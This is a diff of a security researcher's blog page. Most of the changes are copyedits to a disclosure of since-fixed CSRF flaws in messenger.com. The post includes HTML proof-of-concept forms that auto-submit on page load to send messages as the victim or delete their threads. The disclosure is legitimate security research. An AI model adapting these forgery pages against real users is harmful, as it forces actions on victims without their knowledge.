@@ -19,7 +19,7 @@
     <meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1">
     <meta name=viewport content="width=device-width, initial-scale=1">
 
-    <meta name=description content="Cyber Security Engineer (Offensive Security)">
+    <meta name=description content="Application and Infrastructure Security Engineering">
     <meta name=author content="Mazin Ahmed">
     <meta property="og:image" content="https://mazinahmed.net/assets/images/image.jpg">
     <meta property="og:type" content="profile">
@@ -1493,10 +1493,10 @@ pre {
                 </li>
         
 
-        
-            <li class="item">
-                <a class="link" target="_blank" href="https://mazinahmed.net/cv">CV</a>
-            </li>
+        <li class="item">
+            <a class="link" href="https://mazinahmed.net/cv">CV</a>
+        </li>
+
         
     </ul>
 </nav>
@@ -1511,7 +1511,7 @@ pre {
     
 
     
-        3 mins
+        2 mins
     
 </span>
 
@@ -1521,20 +1521,20 @@ pre {
 
 <hr />
 
-<p>In this post, I will be demonstrating the findings of multiple interesting cross-site request forgery vulnerabilities that I have identified on Facebook. These vulnerabilities allows an attacker to force the victim to do various actions.</p>
+<p>In this post, I will demonstrate the findings of multiple interesting cross-site request forgery vulnerabilities I identified on Facebook. These vulnerabilities allow an attacker to force the victim to do various actions.</p>
 
-<p>On April 2015, Facebook officially launched messenger.com, a stand-alone Facebook messenger for the web. After hearing about the launch I have started to testing it in my spare time.</p>
+<p>In April 2015, Facebook officially launched messenger.com, a stand-alone messenger for the web. After hearing about the launch, I started to test it in my spare time.</p>
 
 <hr />
 
 <h1 id="sending-unrestricted-messages-to-any-user-via-csrf">Sending Unrestricted Messages to Any User via CSRF</h1>
-<p>Using this issue, I was able to force any user to send messages to other users without the user’s knowledge.</p>
+<p>Using this issue, I could force any user to send messages to other users without the user’s knowledge.</p>
 
 <h3 id="poc">POC:</h3>
 
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;title&gt;</span>POC @mazen160<span class="nt">&lt;/title&gt;</span>
-<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"javascript:document.csrf_form.submit()"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">" javascript:document.csrf_form.submit()"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"csrf_form"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"https://www.messenger.com/ajax/mercury/send_messages.php"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"message_batch[0][author]"</span> <span class="na">name=</span><span class="s">"message_batch[0][author]"</span> <span class="na">value=</span><span class="s">"fbid:VALUE1"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"message_batch[0][is_filtered_content]"</span> <span class="na">name=</span><span class="s">"message_batch[0][is_filtered_content]"</span> <span class="na">value=</span><span class="s">"false"</span><span class="nt">&gt;</span>
@@ -1557,9 +1557,10 @@ pre {
 </ul>
 
 <h1 id="deleting-any-messages-via-csrf">Deleting Any messages via CSRF</h1>
-<p>Using this issue, I was able to force any user to delete messaging threads.</p>
+<p>Using this issue, I could force any user to delete messaging threads.</p>
 
 <h3 id="poc-1">PoC:</h3>
+
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
 &lt;title&gt;POC @mazen160&lt;/title&gt;
 &lt;body onload="javascript:document.csrf_form.submit()"&gt;
@@ -1577,11 +1578,10 @@ pre {
 &lt;/html&gt;
 </code></pre></div></div>
 
-<p>Change of the value of <code class="language-plaintext highlighter-rouge">ids[0]</code> parameter to the victim’s thread ID.</p>
+<p>Change the value of the <code class="language-plaintext highlighter-rouge">ids[0]</code> parameter to the victim’s thread ID.</p>
 
-<p>The issues has been fixed very quickly. I would like to thank Facebook security team for their outstanding work in responding to security submissions.</p>
+<p>The issues have been fixed very quickly. I thank the Facebook security team for their outstanding work responding to security submissions.</p>
 
-<p>If you need any help securing your web-application or service, you can contact me by E-Mail, or Twitter.</p>
 
 
 
